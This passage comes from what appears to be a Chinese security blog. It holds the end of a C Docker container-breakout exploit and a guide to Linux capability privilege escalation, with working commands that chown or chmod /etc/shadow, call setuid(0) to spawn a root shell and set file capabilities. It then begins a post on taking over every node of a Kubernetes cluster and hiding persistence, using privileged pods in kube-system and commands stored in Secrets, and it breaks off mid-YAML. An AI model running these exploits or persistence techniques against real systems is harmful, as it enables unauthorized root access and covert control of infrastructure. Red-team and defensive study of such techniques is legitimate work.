== <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[*] (%s) Trying: 0x%08x\n&quot;</span>, de -&gt; d_name, i);</span><br><span class="line">      <span class="keyword">if</span> (open_by_handle_at(bfd, (<span class="keyword">struct</span> file_handle * ) &amp; outh, <span class="number">0</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        closedir(dir);</span><br><span class="line">        close(fd);</span><br><span class="line">        dump_handle( &amp; outh);</span><br><span class="line">        <span class="keyword">return</span> find_handle(bfd, path, &amp; outh, oh);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  closedir(dir);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="type">int</span> fd1, fd2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">my_file_handle</span> <span class="title">h</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">my_file_handle</span> <span class="title">root_h</span> =</span> &#123;</span><br><span class="line">    .handle_bytes = <span class="number">8</span>,</span><br><span class="line">    .handle_type = <span class="number">1</span>,</span><br><span class="line">    .f_handle = &#123;</span><br><span class="line">      <span class="number">0x02</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[***] docker VMM-container breakout Po(C) 2014 [***]\n&quot;</span></span><br><span class="line">    <span class="string">&quot;[***] The tea from the 90&#x27;s kicks your sekurity again. [***]\n&quot;</span></span><br><span class="line">    <span class="string">&quot;[***] If you have pending sec consulting, I&#x27;ll happily [***]\n&quot;</span></span><br><span class="line">    <span class="string">&quot;[***] forward to my friends who drink secury-tea too! [***]\n\n&lt;enter&gt;\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// get a FS reference from something mounted in from outside</span></span><br><span class="line">  <span class="keyword">if</span> ((fd1 = open(<span class="string">&quot;/etc/hostname&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">    die(<span class="string">&quot;[-] open&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (find_handle(fd1, argv[<span class="number">1</span>], &amp; root_h, &amp; h) &lt;= <span class="number">0</span>)</span><br><span class="line">    die(<span class="string">&quot;[-] Cannot find valid handle!&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] Got a final handle!\n&quot;</span>);</span><br><span class="line">  dump_handle( &amp; h);</span><br><span class="line">  <span class="keyword">if</span> ((fd2 = open_by_handle_at(fd1, (<span class="keyword">struct</span> file_handle * ) &amp; h, O_RDWR)) &lt; <span class="number">0</span>)</span><br><span class="line">    die(<span class="string">&quot;[-] open_by_handle&quot;</span>);</span><br><span class="line">  <span class="type">char</span> * line = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="number">0</span>;</span><br><span class="line">  FILE * fptr;</span><br><span class="line">  <span class="type">ssize_t</span> read;</span><br><span class="line">  fptr = fopen(argv[<span class="number">2</span>], <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ((read = getline( &amp; line, &amp; len, fptr)) != <span class="number">-1</span>) &#123;</span><br><span class="line">    write(fd2, line, read);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Success!!\n&quot;</span>);</span><br><span class="line">  close(fd2);</span><br><span class="line">  close(fd1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CAP-CHOWN"><a href="#CAP-CHOWN" class="headerlink" title="CAP_CHOWN"></a>CAP_CHOWN</h2><p>CAP_CHOWN: 可以改变任何文件的所有权</p><p><strong>当文件具有能力：</strong><br>假设python二进制文件具有这种能力，可以改变<code>/etc/shadow</code>的所有者，改变root的密码以此提权。<br>python具有CAP_CHOWN，当前<code>/etc/shadow</code>还是root的<br><img src="https://s2.loli.net/2023/01/09/rkQdWypBNwPa94G.png" alt="image.png"><br>通过利用python所有者已经变更<br><img src="https://s2.loli.net/2023/01/09/ikmReVcCBr5Kn2Y.png" alt="image.png"><br>或者ruby可以通过如下命令</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e <span class="string">&#x27;require &quot;fileutils&quot;; FileUtils.chown(1000, 1000, &quot;/etc/shadow&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="CAP-FOWNER"><a href="#CAP-FOWNER" class="headerlink" title="CAP_FOWNER"></a>CAP_FOWNER</h2><p>CAP_FOWNER：更改任何文件的权限<br>类似CAP_CHOWN，python具有这种能力，可以改变<code>/etc/shadow</code>的所有者，改变root的密码以此提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import os;os.chmod(&quot;/etc/shadow&quot;,0666)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="CAP-SETUID"><a href="#CAP-SETUID" class="headerlink" title="CAP_SETUID"></a>CAP_SETUID</h2><p>CAP_SETUID：允许设置所创建进程的有效用户ID</p><p><strong>当文件具有能力：</strong><br>具有该能力，可以设置uid为0后，调用bash达到提权</p><ul><li>python</li><li>perl</li><li>tar</li></ul><p>比如利用python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.setuid(<span class="number">0</span>)</span><br><span class="line">os.system(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">python3<span class="number">.8</span> -c <span class="string">&#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> prctl</span><br><span class="line"><span class="comment"># 在集合effective中添加capability</span></span><br><span class="line">prctl.cap_effective.setuid = <span class="literal">True</span></span><br><span class="line">os.setuid(<span class="number">0</span>)</span><br><span class="line">os.system(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/09/NpPxgQBUJ1DzuTO.png" alt="image.png"><br><img src="https://s2.loli.net/2023/01/09/QwU6YpycD9zLSRg.png" alt="image.png"></p><h2 id="CAP-SETGID"><a href="#CAP-SETGID" class="headerlink" title="CAP_SETGID"></a>CAP_SETGID</h2><p>CAP_SETGID：允许设置所创建进程的有效组ID</p><p><strong>当文件具有能力：</strong><br>可以通过覆盖文件来提权，找到组可以操作的文件，因为可以设置为任何组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找组可写的每个文件</span></span><br><span class="line">find / -perm /g=w -<span class="built_in">exec</span> <span class="built_in">ls</span> -lLd &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 在/etc中找到每一个maxpath为1的组可写文件</span></span><br><span class="line">find /etc -maxdepth 1 -perm /g=w -<span class="built_in">exec</span> <span class="built_in">ls</span> -lLd &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 在/etc中查找每一个maxpath为1的组可读文件</span></span><br><span class="line">find /etc -maxdepth 1 -perm /g=r -<span class="built_in">exec</span> <span class="built_in">ls</span> -lLd &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>找到一个文件，就可以滥用（通过读或写）升级权限，得到一个shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.setgid(<span class="number">42</span>)</span><br><span class="line">os.system(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure><p>shadow的组id为42，可以通过python创建一个shell<br><img src="https://s2.loli.net/2023/01/09/1q6ieS3IZo2P5C7.png" alt="image.png"><br>创建的进程被设置组id为shadow，可以<code>cat /etc/shadow</code><br><img src="https://s2.loli.net/2023/01/09/Iy1M2iVQwcgkJdo.png" alt="image.png"></p><p>主要可以进行如下操作：</p><ul><li>将用户和密码添加到&#x2F;etc&#x2F;passwd</li><li>在&#x2F;etc&#x2F;shadow中更改密码</li><li>在&#x2F;etc&#x2F;sudoers中将用户添加到sudoers</li><li>通过docker套接字通信利用docker，一般在<code>/run/docker.sock</code>或<code>/var/run/docker.sock</code></li></ul><h2 id="CAP-SETFCAP"><a href="#CAP-SETFCAP" class="headerlink" title="CAP_SETFCAP"></a>CAP_SETFCAP</h2><p>CAP_SETFCAP：可以给文件和进程设置能力</p><p><strong>当文件具有能力：</strong><br>当python具有该能力可以通过脚本提权到root<code>python3.8 setfcap.py /usr/bin/python3.8</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes, sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#Load needed library</span></span><br><span class="line"><span class="comment">#You can find which library you need to load checking the libraries of local setcap binary</span></span><br><span class="line"><span class="comment"># ldd /sbin/setcap</span></span><br><span class="line">libcap = ctypes.cdll.LoadLibrary(<span class="string">&quot;libcap.so.2&quot;</span>)</span><br><span class="line"></span><br><span class="line">libcap.cap_from_text.argtypes = [ctypes.c_char_p]</span><br><span class="line">libcap.cap_from_text.restype = ctypes.c_void_p</span><br><span class="line">libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]</span><br><span class="line"></span><br><span class="line"><span class="comment">#Give setuid cap to the binary</span></span><br><span class="line">cap = <span class="string">&#x27;cap_setuid+ep&#x27;</span></span><br><span class="line">path = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(path)</span><br><span class="line">cap_t = libcap.cap_from_text(cap)</span><br><span class="line">status = libcap.cap_set_file(path,cap_t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(status == <span class="number">0</span>):</span><br><span class="line">    <span class="built_in">print</span> (cap + <span class="string">&quot; was successfully added to &quot;</span> + path)</span><br></pre></td></tr></table></figure><p>通过给python添加新能力，新能力将直接覆盖原本的能力，如果想保留可以通过在原有的基础上添加比如<code>cap_setuid,cap_setfcap+ep</code></p><p><strong>当环境具有能力：</strong><br>该能力是默认添加给docker进程的能力，该能力允许给其他二进制的文件添加能力，所以可以给其他二进制文件添加可以用来逃逸的能力</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work">https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work</a></li><li><a href="https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html">https://www.trendmicro.com/en_us&#x2F;research&#x2F;19&#x2F;l&#x2F;why-running-a-privileged-container-in-docker-is-a-bad-idea.html</a></li><li><a href="https://blog.ploetzli.ch/2014/understanding-linux-capabilities/">https://blog.ploetzli.ch/2014/understanding-linux-capabilities/</a></li><li><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></li><li><a href="https://s3hh.wordpress.com/2015/07/25/ambient-capabilities/">https://s3hh.wordpress.com/2015/07/25/ambient-capabilities/</a></li><li><a href="https://pierrchen.blogspot.com/2018/05/container-deep-dive-3-linux-capabilities.html">https://pierrchen.blogspot.com/2018/05/container-deep-dive-3-linux-capabilities.html</a></li><li><a href="https://www.onitroad.com/jc/linux/man-pages/linux/man7/capabilities.7.html">https://www.onitroad.com/jc/linux/man-pages/linux/man7/capabilities.7.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Linux提权 </tag>
            
            <tag> 容器逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取k8s的Cluster Admin权限后的横向节点与持久化探索</title>
      <link href="/posts/c6ff0a27/"/>
      <url>/posts/c6ff0a27/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通常在红蓝对抗中，我们可能会通过各种方法如弱口令、sql注入、web应用漏洞导致的RCE等等方法获得服务器的权限；在当前云原生迅猛发展的时代，这台服务器很可能是一个容器，在后续的后渗透由传统的提权变为容器逃逸，内网信息收集变为集群的信息收集，内网横向变成集群横向，拿下域控或者靶标变成获得集群的管理员权限；但是当拿下集群后如何拿下他们的宿主机呢以及如何针对集群做持久化呢？本文主要从此来思考，由于目前主流的容器编排引擎和容器集群管理工具是Kubernetes，所以下文以Kubernetes集群为准。<br><img src="https://s2.loli.net/2023/01/03/6W72oS18xeraJpn.jpg"></p><h1 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h1><p><strong>Kubernetes</strong> 是一个开源的容器编排引擎和容器集群管理工具，用来对容器化应用进行自动化部署、 扩缩和管理。<br><strong>Kubernetes</strong> 这个名字源于希腊语，意为“舵手”或“飞行员”。k8s 这个缩写是因为 k 和 s 之间有8个字符。 Google 在 2014 年开源了 Kubernetes 项目。 </p><h2 id="Kubernetes架构"><a href="#Kubernetes架构" class="headerlink" title="Kubernetes架构"></a>Kubernetes架构</h2><p>一个Kubernetes集群至少包含一个控制平面(control plane)，以及一个或多个工作节点(worker node)。工作节点会托管 Pod ，而 Pod 就是作为应用负载的组件。 控制平面管理集群中的工作节点和 Pod。<br><strong>控制平面(Control Plane) :</strong>  控制平面负责管理工作节点和维护集群状态。所有任务分配都来自于控制平面。<br><strong>工作节点(Worker Node) :</strong>  工作节点负责执行由控制平面分配的请求任务,运行实际的应用和工作负载。</p><p>我们最终的目的就是要获得所有的节点的权限，其中一般情况下是一个<code>master</code>节点，多个<code>worker</code>节点。</p><h3 id="控制平面"><a href="#控制平面" class="headerlink" title="控制平面"></a>控制平面</h3><p>控制平面组件会为集群做出全局决策，比如资源的调度、检测和响应集群事件。<br><img src="https://s2.loli.net/2023/01/03/yNYFIzKwROBJ8Uk.png" alt="image.png"></p><ul><li><code>kube-apiserver</code>: 对Kubernetes集群进行交互时需要api，该组件负责公开了 Kubernetes API，负责处理接受请求的工作。 API 服务器是 Kubernetes 控制平面的前端。</li><li><code>kube-scheduler</code>: 负责监视新创建的、未指定运行节点（node）的 Pods， 并选择节点来让 Pod 在上面运行。</li><li><code>kube-controller-manager</code>: 控制器负责实际运行集群，<code>controller-manager</code>控制器管理器则是将多个控制器功能合而为一，降低了程序的复杂性。</li><li><code>etcd</code>: 一致且高度可用的键值存储，用作 Kubernetes 的所有集群数据的后台数据库。</li></ul><h3 id="Node-组件"><a href="#Node-组件" class="headerlink" title="Node 组件"></a>Node 组件</h3><p>节点组件会在每个节点上运行，负责维护运行的 Pod 并提供 Kubernetes 运行环境。<br><img src="https://s2.loli.net/2023/01/03/V9dgH1bC5h2vaOx.png" alt="image.png"></p><ul><li><code>kubelet</code>: kubelet 会在集群中每个节点（node）上运行。 它保证容器（containers）都运行在 Pod 中。当控制平面需要在节点中执行某个操作时，kubelet 就会执行该操作。kubelet 不会管理不是由 Kubernetes 创建的容器。</li><li><code>kube-proxy</code>: kube-proxy 是集群中每个节点（node）上所运行的网络代理， 实现 Kubernetes 服务（Service） 概念的一部分。kube-proxy 维护节点上的一些网络规则， 这些网络规则会允许从集群内部或外部的网络会话与 Pod 进行网络通信。</li><li><strong>容器运行时(Container Runtime)</strong>: 容器运行环境是负责运行容器的软件。Kubernetes 支持许多容器运行环境，例如 containerd、docker或者其他实现了 Kubernetes CRI (容器运行环境接口)的容器。</li></ul><h2 id="工作负载"><a href="#工作负载" class="headerlink" title="工作负载"></a>工作负载</h2><p>工作负载是在 Kubernetes 上运行的应用程序。</p><p>在 Kubernetes 中，无论你的负载是由单个组件还是由多个一同工作的组件构成，你都可以在一组 Pod 中运行它。 在 Kubernetes 中，Pod 代表的是集群上处于运行状态的一组容器的集合。</p><p>可以通过利用不同的工作负载资源达到我们的目的在每一个节点上跑一个特权Pod。</p><h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3><p><strong>Deployment</strong>是对ReplicaSet和Pod更高级的抽象。<br>它使Pod拥有多副本，自愈，扩缩容、滚动升级等能力。</p><p><strong>ReplicaSet</strong>(副本集)是一个Pod的集合。<br>它可以设置运行Pod的数量，确保任何时间都有指定数量的 Pod 副本在运行。<br>通常我们不直接使用ReplicaSet，而是在Deployment中声明。</p><h3 id="StatefulSet"><a href="#StatefulSet" class="headerlink" title="StatefulSet"></a>StatefulSet</h3><p><strong>StatefulSet</strong> 是用来管理有状态的应用。一般用于管理数据库、缓存等。<br>与 Deployment 类似， StatefulSet用来管理 Pod 集合的部署和扩缩。</p><h3 id="DaemonSet"><a href="#DaemonSet" class="headerlink" title="DaemonSet"></a>DaemonSet</h3><p><strong>DaemonSet</strong> 确保全部（或者某些）节点上运行一个 Pod 的副本。 当有节点加入集群时， 也会为他们新增一个 Pod 。 当有节点从集群移除时，这些 Pod 也会被回收。删除 DaemonSet 将会删除它创建的所有 Pod。</p><h3 id="CronJob"><a href="#CronJob" class="headerlink" title="CronJob"></a>CronJob</h3><p><strong>Job</strong> 会创建一个或者多个 Pod，并将继续重试 Pod 的执行，直到指定数量的 Pod 成功终止。 随着 Pod 成功结束，Job 跟踪记录成功完成的 Pod 个数。 当数量达到指定的成功个数阈值时，任务（即 Job）结束。<br>一个 <strong>CronJob</strong> 对象就像 <em>crontab</em> (cron table) 文件中的一行。 它用 <a href="https://en.wikipedia.org/wiki/Cron">Cron</a> 格式进行编写， 并周期性地在给定的调度时间执行 Job。</p><h2 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h2><p>**命名空间(Namespace)**是一种资源隔离机制，将同一集群中的资源划分为相互隔离的组。</p><p>Kubernetes 会创建四个初始命名空间：</p><ul><li><code>default</code>: 默认的命名空间，不可删除，未指定命名空间的对象都会被分配到default中。</li><li><code>kube-system</code>: Kubernetes 系统对象(控制平面和Node组件)所使用的命名空间。</li><li><code>kube-public</code>: 自动创建的公共命名空间，所有用户（包括未经过身份验证的用户）都可以读取它。通常我们约定，将整个集群中公用的可见和可读的资源放在这个空间中。 </li><li><code>kube-node-lease</code>: <a href="https://kubernetes.io/docs/reference/kubernetes-api/cluster-resources/lease-v1/">租约（Lease）</a>对象使用的命名空间。每个节点都有一个关联的 lease 对象，lease 是一种轻量级资源。lease对象通过发送<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/#heartbeats">心跳</a>，检测集群中的每个节点是否发生故障。</li></ul><p>下图为使用<code>kubeadm</code>搭建的k8s集群默认的ns以及相关资源。<br><img src="https://s2.loli.net/2023/01/03/zYcMZpovkBUKL8F.png" alt="image.png"><br>k8s集群默认的<code>leases</code><br><img src="https://s2.loli.net/2023/01/03/RwuYsl4jqTZWLMk.png" alt="image.png"></p><p>可以将我们的Pod跑在当前集群看起来不常用的ns，比如<code>kube-system</code>。</p><h2 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h2><p>将数据存储在容器中，一旦容器被删除，数据也会被删除，在k8s中给出了卷(Volume)这一概念来解决存储。<br>卷是独立于容器之外的一块存储区域，通过挂载(Mount)的方式供Pod中的容器使用。</p><p>常见的卷类型有：</p><ul><li><strong>临时卷(Ephemeral Volume)：</strong><ul><li>emptyDir  - 作为缓存或存储日志</li><li>configMap 、secret、 downwardAPI（给Pod注入数据）</li></ul></li><li><strong>持久卷(Persistent Volume)：</strong><ul><li>本地存储 - hostPath、 local</li><li>网络存储 - NFS</li><li>分布式存储 - Ceph(cephfs文件存储、rbd块存储)</li></ul></li><li><strong>投射卷(Projected Volumes)：</strong>projected 卷可以将多个卷映射到同一个目录上</li></ul><p>根据名字可以看出临时卷和持久卷的主要特点，临时卷与Pod一起创建和删除，生命周期与Pod相同；持久卷主要删除Pod后，持久卷不会被删除。</p><p>通过以上特点我们可以将一些需要利用的敏感数据放在临时卷内，随Pod一起删除。</p><h3 id="ConfigMap"><a href="#ConfigMap" class="headerlink" title="ConfigMap"></a>ConfigMap</h3><ul><li>用来在键值对数据库(etcd)中保存非加密数据。一般用来保存配置文件。</li><li>可以用作环境变量、命令行参数或者存储卷。</li><li>将环境配置信息与容器镜像解耦，便于配置的修改。</li><li>在设计上不是用来保存大量数据的。</li></ul><p>在 ConfigMap 中保存的数据不可超过 1 MiB。<br>超出此限制，需要考虑挂载存储卷或者访问文件存储服务。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">game-demo</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="comment"># property-like keys; each key maps to a simple value</span></span><br><span class="line">  <span class="attr">player_initial_lives:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line">  <span class="attr">ui_properties_file_name:</span> <span class="string">&quot;user-interface.properties&quot;</span></span><br><span class="line">  <span class="comment"># file-like keys</span></span><br><span class="line">  <span class="attr">game.properties:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    enemy.types=aliens,monsters</span></span><br><span class="line"><span class="string">    player.maximum-lives=5    </span></span><br><span class="line"><span class="string"></span>  <span class="attr">user-interface.properties:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    color.good=purple</span></span><br><span class="line"><span class="string">    color.bad=yellow</span></span><br><span class="line"><span class="string">    allow.textmode=true    </span></span><br></pre></td></tr></table></figure><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p><strong>Secret</strong> 用于保存机密数据的对象。一般由于保存密码、令牌或密钥等。 </p><ul><li><code>data</code>字段用来存储 base64 编码数据。</li><li><code>stringData</code>存储未编码的字符串。</li></ul><p>Secret 意味着你不需要在应用程序代码中包含机密数据，减少机密数据(如密码)泄露的风险。<br>Secret 可以用作环境变量、命令行参数或者存储卷文件。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">mysecret</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">USER_NAME:</span> <span class="string">YWRtaW4=</span></span><br><span class="line">  <span class="attr">PASSWORD:</span> <span class="string">OGZmN2I3c3Y5OGZieTdneWQ=</span></span><br></pre></td></tr></table></figure><h2 id="管理对象"><a href="#管理对象" class="headerlink" title="管理对象"></a>管理对象</h2><ul><li><p><strong>命令行指令</strong><br>例如，使用<code>kubectl</code>命令来创建和管理 Kubernetes 对象。<br>命令行就好比口头传达，简单、快速、高效。<br>但它功能有限，不适合复杂场景，操作不容易追溯，多用于开发和调试。</p></li><li><p><strong>声明式配置</strong><br>kubernetes使用yaml文件来描述 Kubernetes 对象。<br>声明式配置就好比申请表，学习难度大且配置麻烦。<br>好处是操作留痕，适合操作复杂的对象，多用于生产。</p></li></ul><h2 id="配置对象"><a href="#配置对象" class="headerlink" title="配置对象"></a>配置对象</h2><p>在创建的 Kubernetes 对象所对应的 <code>yaml</code>文件中，需要配置的字段如下：</p><ul><li><code>apiVersion</code>: Kubernetes API 的版本</li><li><code>kind</code>: 对象类别，例如<code>Pod</code>、<code>Deployment</code>、<code>Service</code>、<code>ReplicaSet</code>等</li><li><code>metadata</code>: 描述对象的元数据，包括一个 <code>name</code> 字符串、<code>UID</code> 和可选的<code>namespace</code></li><li><code>spec</code>: 对象的配置</li></ul><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p><strong>标签（Labels）</strong> 是附加到对象（比如 Pod）上的键值对，用于补充对象的描述信息。<br>标签使用户能够以松散的方式管理对象映射，而无需客户端存储这些映射。<br>由于一个集群中可能管理成千上万个容器，我们可以使用标签高效的进行选择和操作容器集合。</p><h3 id="nodeSelector"><a href="#nodeSelector" class="headerlink" title="nodeSelector"></a>nodeSelector</h3><p><strong>nodeSelector</strong> 是一个选择算符，这些算符必须取值为 true 才能认为 Pod 适合在节点上运行。 选择算符必须与节点的标签匹配，以便在该节点上调度 Pod。</p><h3 id="Affinity"><a href="#Affinity" class="headerlink" title="Affinity"></a>Affinity</h3><p><strong>Affinity 是一组亲和性调度规则。</strong></p><ul><li><p><strong>affinity.nodeAffinity</strong> (<a href="https://kubernetes.io/zh-cn/docs/reference/kubernetes-api/workload-resources/pod-v1/#NodeAffinity">NodeAffinity</a>)描述 Pod 的节点亲和性调度规则。</p></li><li><p><strong>affinity.podAffinity</strong> (<a href="https://kubernetes.io/zh-cn/docs/reference/kubernetes-api/workload-resources/pod-v1/#PodAffinity">PodAffinity</a>)描述 Pod 亲和性调度规则（例如，将此 Pod 与其他一些 Pod 放在同一节点、区域等）。</p></li><li><p><strong>affinity.podAntiAffinity</strong> (<a href="https://kubernetes.io/zh-cn/docs/reference/kubernetes-api/workload-resources/pod-v1/#PodAntiAffinity">PodAntiAffinity</a>)描述 Pod 反亲和性调度规则（例如，避免将此 Pod 与其他一些 Pod 放在相同的节点、区域等）。</p></li></ul><blockquote><p>如果同时设置nodeSelector和nodeAffinity则必须同时满足两个条件，Pod才会运行到最终的节点上<br>如果同时指定多个nodeSelectorTerms，只要满足其中一个就可以匹配成功<br>如果nodeSelectorTerms有多个matchExpressions，则必须满足所有matchExpressions才可以运行Pod；</p></blockquote><p>我们可以通过编写yaml创建需要利用的工作负载，结合相关配置跑在每个节点上。</p><h1 id="部署一个Deployment在每个node利用"><a href="#部署一个Deployment在每个node利用" class="headerlink" title="部署一个Deployment在每个node利用"></a>部署一个Deployment在每个node利用</h1><p>通过对kubernetes的了解，可以利用工作负载的特性利用Deployment、DaemonSet等创建相关资源，通过亲和性或者选择器等等在每一个节点上部署一个特权Pod，并将Pod通过配置命令执行的方式，获取所有Pod的shell，相当于获得了所有的节点宿主机权限。<br>deployment部署每一个pod到node上，可以通过查看每个node对应的labels，选择一个所有node都能匹配到的。<br><img src="https://s2.loli.net/2023/01/03/tfsCB2uFzbAxlTi.png" alt="image.png"><br>通过<code>nodeSelector</code>或者<code>affinity.nodeAffinity</code>将所有node选择到，查看node相关labels，直接匹配的话，由于master默认设置<a href="https://kubernetes.io/zh-cn/docs/concepts/scheduling-eviction/taint-and-toleration/">污点</a>无法匹配，可以通过容忍度设置在控制平面节点上运行<br><img src="https://s2.loli.net/2023/01/03/yf6rujmcI2ZV9Ng.png" alt="image.png"><br>对于命令的配置可以直接写在相关的spec内，也可以利用k8s的存储，临时卷具有更好的隐蔽性，其中Secret更隐秘些。<br>创建相关资源</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 